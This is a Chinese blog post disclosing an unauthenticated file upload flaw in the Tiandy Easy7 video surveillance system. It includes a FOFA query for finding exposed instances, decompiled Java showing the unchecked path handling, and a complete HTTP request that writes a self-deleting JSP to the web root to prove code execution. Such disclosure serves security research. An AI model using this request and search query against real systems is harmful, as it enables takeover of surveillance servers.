---
title: "天地伟业Easy7 uploadMapServerBgImage 文件上传漏洞"
source: https://mrxn.net/jswz/easy7-file-uploadMapServerBgImage-rce.html
asset_dir: assets/天地伟业easy7-uploadmapserverbgimage-文件上传漏洞
---

# 天地伟业Easy7 uploadMapServerBgImage 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/2/12 08:28
* 254浏览
* [0评论](#comment)
* 33分钟阅读

深入探索

REST

应用程序

rest


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

天地伟业Easy7是一款用于视频监控管理的软件系统。

漏洞修复方案

该系统的/Easy7/rest/file/uploadMapServerBgImage接口存在前台的任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)接口，可构造请求包，上传webshell文件并保存在任意路径，从而控制服务器。漏洞利用难度极低，可在未登录的状态下直接发送恶意请求包造成利用，可能被蠕虫、黑客组织批量利用。

# 影响版本

# fofa语法

> body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7\_logo\_transparent.png") && title="平台"

# 漏洞分析

深入探索

漏洞预警服务

安全研究报告

漏洞扫描服务

首先，该系统基于Spring 3.0，比较古老且WEB-INF/web.xml里没有配置任何filter进行权限校验，因此绝大部分接口都是可以直接访问的。

物流软件安全

再来看本次的[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)接口 /Easy7/rest/file/uploadMapServerBgImage 的对应方法`uploadMapServerBgImage()`的实现逻辑

```
@Controller
@RequestMapping({"/file"})
public class CLS_REST_File {
    @Resource(
        name = "boSystemInfo"
    )
    private CLS_BO_SystemInfo boSystemInfo;
    @Resource(
        name = "boFile"
    )
    private CLS_BO_File boFile;
    @Resource(
        name = "boPROXY"
    )
    private CLS_BO_PROXY boPROXY;
    private static final Log log = LogFactory.getLog(CLS_REST_File.class);

    @RequestMapping({"/uploadMapServerBgImage"})
    public void uploadMapServerBgImage(HttpServletRequest request, HttpServletResponse response) throws IOException {
        response.getWriter().print("<html><body><textarea>" + JSONObject.fromObject(this.boFile.uploadFiles(request)).toString() + "</textarea></body></html>");
    }
```

跟进 `this.boFile.uploadFiles`方法

[![天地伟业Easy7 uploadMapServerBgImage 文件上传漏洞](images/img-001-7a2d654ac45a.webp)](https://image.mrxn.net/ccca98777b88473f834e4ff201da19a1.webp)

当上传数据中有`name="uploadParams"`的内容时，从json数组中提取文件的存储路径（`path`）和保存文件名（`name`）。

然后看接下来文件保存位置以及文件名的处理逻辑

计算机科学

```
String uploadPath = null;
if (StringUtils.isNotEmpty(mapServerBgImageItems.getPath())) {
    uploadPath = mapServerBgImageItems.getPath();
}
......
File dir = new File(CLS_Easy7_Types.PROJECT_PATH + uploadPath);
if (!dir.exists()) {
    dir.mkdirs();
}
String savedName = null;
if (mapServerBgImageItems.getName() != null) {
    savedName = mapServerBgImageItems.getName();
}

fileName = fileItem.getName();
```

关键的[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)保存处理操作如下

计算机服务器

```
try {
    fis = fileItem.getInputStream();
    fos = new FileOutputStream(CLS_Easy7_Types.PROJECT_PATH + uploadPath + "/" + savedName);
    byte[] buf = new byte[1024];
    int len = 0;

    while((len = fis.read(buf)) >= 0) {
        fos.write(buf, 0, len);
    }
    continue;
```

其中重点看下`CLS_Easy7_Types.PROJECT_PATH`是如何定义的

```
ROJECT_PATH = CLS_Easy7_Types.class.getResource("/").getPath() + "../../";
```

> 在标准的 Tomcat 部署结构中，一个 Web 应用的类文件通常存放在 webapps/应用名/WEB-INF/classes/ 目录下。当你调用 CLS\_Easy7\_Types.class.getResource("/") 时，Java 返回的是当前 ClassLoader 加载资源的根路径，也就是这个 classes 目录的绝对路径。
>
> 黑客与破解
>
> 接着看后面的路径回溯操作。第一个 ../ 会让你从 classes 目录退回到 WEB-INF 目录；第二个 ../ 则会让你从 WEB-INF 进一步退回到 应用名 这一层，也就是我们常说的 WebRoot（Web 应用根目录）。
>
> 所以，PROJECT\_PATH 最终指向的就是你的 Web 应用在服务器上的物理根目录。

因此我们只需要在`uploadParams`的json数组里指定path的值为当前目录`/`即可，name为希望保存的文件名，即可将任意文件上传到当前应用根目录，从而造成任意文件上传漏洞，根本不需要网上的POC还目录穿越到不同形式的目录即可完成[RCE](https://mrxn.net/tag/rce)。

# 漏洞复现

```
POST /Easy7/rest/file/uploadMapServerBgImage HTTP/1.1
Host: easy7.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="uploadParams"

[{"path": "/", "name": "x.jsp"}]
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.png"
Content-Type: image/png

<%out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary--
```

访问 `/Easy7/x.jsp` 成功执行代码并删除自身

漏洞修复方案

[![天地伟业Easy7 uploadMapServerBgImage 文件上传漏洞](images/img-002-8bb83f896852.webp)](https://image.mrxn.net/6f84ca6b882d4d91af197786c7dd7554.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[天地伟业Easy7 uploadMapServerBgImage 文件上传漏洞](https://mrxn.net/jswz/easy7-file-uploadMapServerBgImage-rce.html)  
文章链接：<https://mrxn.net/jswz/easy7-file-uploadMapServerBgImage-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

计算机服务器

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALZ0lEQVR4Aeyai3LbyA5Edfb//9k3cOdQHHBGlJ3EUtWlarHNbjQwowHpl/Lf7Xb7+E58LF6918J2kK07JH4LPS+f4e+SA+g9JJrQfXKx2bfzU9f3HayB/Kq7/nuXE9gG8mu6t2eibxy4wT16/oxDal0bwnud+ZVe+Z6Tw7wnjDqM3PrqXSGH+CCo3rFqnol93TaQvXhdv+4EDgOBTB1GPNuid4I+Ocz7QHR9z9bpm6G9IL27p+fl3XfGv1oH2Q+MOFvnMJCZ6dJ+7gT+2kAg03/27tEHqfMtQ7j5rkPy6o8Q4rUXhPcaGPUzf6/X3/Xv8L82kO8sftUcT+CfDQTGu86l4TkdRt/qLoT44I6utao50yG97CP2us71/Qn+s4H8yab+n2sPA3HqHc8OSf+n74n/wfwutLT3g9Fvfob2gLGm65C8PcyLXYf4IajvDO3TcVZ3GMjMdGk/dwLbQCBTh8d4tjVIvXeD/q9y68Rerw5ZD1Da0Brg868Jcg1ySF69IySvf5Vf6ZB6mOO+bhvIXryuX3cC/zn1r6Jbtg4y/c71wTyvX58Io1+9o/WFPQdjD3iO2wdGv3qtVQGP8+X5alxPiKf8JngYCGTqfX8QHeaoH5KXd4TkvXMgvPs6h9EH4XBEa8/WMN/9chHGNdR7PcRnHsLhMeovPAykxCtedwKHgTh1GKfqFs13NC+u8urdJ/8X6Joi5L25FoRDUJ/5ztUhfnnHVV337flhIPvkdf3zJ7AcyGq6kLsCgn3Lqzp1SB2MaB99cojv4+Pj8xNN9e5T3yOkVg1Grn7WC8Y6CO91nUN8q3X0Q3zAbTmQ2/V6yQn8B/fpANsmgOG3W6cpbsZ2AamDOa7qIX7b6RNhzMPIq05vXVec8fJUQHqt/CsdUlc9KmDkvQ6S77q88HpC6iTfKJYDqWlVQKbqniG8chUQbr5jefZhfq/VtTqkHwTVy1Mhf4Tlq9AD6QXBylWY7wjxdV0O83z1rIDH+d4H4geu7yG3N3sdnhDItNxnTbzijJenQt+zCON6vQ6Sh6D5WqsHjB69on45zP1nPvOi/cSuyyHrQVDdusLDQEq84nUnsPxrr1uCTLNzGHXzZwipg6B+75ZnEVIPd7TWnh0hXvWVH77ng7HOdTqu1i3f9YTUKbxRHAYCmTIE3SuE9+lCdH2rPMRnXrQOkoc5dp/1e9QjQnrJp/hLtAfM/TDqEN7r5L9aDv9B/IoQDkHrCg8DsejC15zANhA4TqsmZrg9iE8uwly3XoTHPvvpl0Pq1CHcfCFEg6DejuXdB8Svpl/e8SwPY79eL5/12Qai6cLXnsBhIPB4un2qncPj+v52rYfUrfiqrut7Dum512bXrmkOUgfBVV5/z8sh9SufOsQHXL+p397sdXhC+nQh0+u67wPGvLp+OcTXOUTXDyPXL0LycEQ9P42QvbguhPueRIiub4aHgcxMl/ZzJ3AYCIxT7NOVi24Vxrqu6xfNy2Gsh3AI6ut18kI9YmnPBDxeA5Jf9errySF1ELTevHyPh4Hsk9f1z5/A9olhX9opQqbbefeveK+DeT99vY86PK4rX6+VQ2o7h7mur2OtsY+eh/QDhk9b9VkrF9ULryfEU3kTXA4EMu2aWoX7resKuVjaPtRh7KPHvBzmPhj1VR3EB2j5/Fcq1V8B+Lxz5WJ5KjqHuV8fzPPVq0JfXVfA3A/Rgev3kNubvbbPQ9xXTbJCDvfpwfFa3wqrVwUca+GulafCPpCcXIToEFTfI4y56ruPvffR9b6mrmHsay2MOoTDiNWjAqJbv8fll6y96br+uRPYfsqqyVWslq7cLLofMn0I9nzn9lzpz+b1FdoLntuD/qqtkIuQPpWrgJHrq9wszMN53fWEeFpvgoeBQKa42h88znuHWA+P/TDmIRxGtF9HuPt6zr1APObV5TDm1TtCfNZD+MrXdevUIfVwx8NANF/4mhO4BvKac1+u+nAgs6r+2M08e02/uM/VtTrksZVXrqLz0vZhvnCv1zXMe1ZuH1VbAfGbg/DK7cP8CvX2PKRf1/UXfnkgvdnF/+4JnP5i6HKQ6cKIq3xNu8J8x8pVdB3S/0yH+OCI1lb/CjmM3q6Xt0K9ritgXle5Cv0w+iDc/AohPuD608ntzV7LL1k1+Qr3W9ez6Hm5CJm+vCPM866lXy6u9Mqb61i5CvW63geMe4GR67Uexrx6x163ypdvOZBedPGfOYHtTyeQacOINbUKGHW3V7kKSL6uK2DOrRPLOwvzHWHsu89Dcnttfw2P83ohPvfVdUhevfs6h9FvnQjJA9f3kNubvbafsvpUO3ffXYdMt+udW98RUt/1FbcvrOvOPOZdA8Ze5iG6XL9chNEH4fpF/Ste+vU9pE7hjeLwPaRPETJtdQg/ew8QHwSt//j4+PxoFaLbB8JhRPMd7df14pAedV0Bj3nvBfF3vXrtA57zrfpA6vc9rydkfxpvcL0NZDVF9wiZ5soHyevXJ6pDfF1fcYi/10N0uKMee4nq4pl+lrePCPc9AMobAp//uAKCW+L3hesVbgP5nbvgxSew/ZQF59OrCcLoK62ivw8YfT3fOcRfvSrO8uWp6L7ikF51/Z2AeT3M9drHPvqa5lY6pC9w/R5ye7PX6ZcsuE8P+PwJqSYO0c/eD8QHQf0QXr0q1EUY8+WpOMvvPXrPELIWBKtHhXUQXS6WpwKSh2BpFfrE0irkEL+88HQgZbri507gMBDI1CDoVmqyFRC9rivO8uWp6D65WJ6KziHrqcPI1QshuepTASMvraK8+yitYq/trytXsdf215WrUINx3a7Lq6ZCXngYSIlXvO4ElgOpyVX0rZVWAbkLIKivchUQHYLmIbw8FV2Xr7BqKnr+KxyyBwj2Wpjr+iB5GLH2VaHvDCH1VWMsB3LW7Mr/mxPYBuKEXAbG6UE4BPWL1onqYtflMPaDcAh2n/wRwtdqYfS7Z4gOQfW+9krvvhWH9Aeu30Nub/banhDIlNzfaurqED8EresIyfe6M59+UT/M+wFaDth7nHHg829P+kQY9cNCTYD4le2z4qVvAylyxetP4DCQPsW+RRin3vNn3P6QPnLRekhebl5c6eYL9UB6wYg9L/9bWHuogKxrXwiHoHrhYSAlXvG6EzgMBDI1CLq1mvQ+ui6H1EHQGgjXt9Jh9EE4jGgfuOtqK3TNjvpXes/LzxCyN/vq71y98DCQEq943Qlsn6n3LaymCJl693e+qu++Z3nvB8d9QDQIWiM+uxak/nZLBTzHYfSl+vb5Extw8wV8arN9XU+Ip/QmuH1i6LTE1f7Mi5Bp6+86jHl9z2LvZ536DPV0hOwFRuw+e0J8q/xKt17UB+nXdfOF1xNSp/BGsX0PgUwPnsOz99Dvgs6tV4esKxdh1K0TIXlA6YDA59dsE/YW1UWI/0/z9usI6d/14tcTUqfwRrENxLvhDM/2Dpk+BO1nHUSHEXteLkL8ctH+hWodK7ePnpfDfI1n8/pcS97xUX4bSC+6+GtO4DAQyF0CI66292jaq5q9flZvXrQWxv3Bna88XZd37GuZVxcha5qHcBjRvHVyUb3wMBBNF77mBP7aQCB3RU25or8dSF69PBUQva4rzHeE0Vfeiu7b88pXqMHYA0Ze3gr9YmkVEH/XK1ehLpZWIYfUy2f41wYya35pXz+BPx4IPJ46zPMw6hBed1RFfyulVaz0fa6uK1ZemK8F0XvdV3mtXbGqg3EdCAeuz9Rvb/Y6PCE12Vms9t29+rou73l5R8hdow7hsEbXgHisFSF698Fc73XP8u5zvY769vphIJoufM0JbAOB3CXwGFfbhO/V7e+Ouu79IX0rV2G+rivkhfDYW/4KiK9qvhJVuw9r1eQrhPm6EB24vofc3uy1PSFvtq//2+38DwAA//8xSlwuAAAABklEQVQDAPWWX61rANd3AAAAAElFTkSuQmCC)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/easy7-file-uploadMapServerBgImage-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

安全工具开发

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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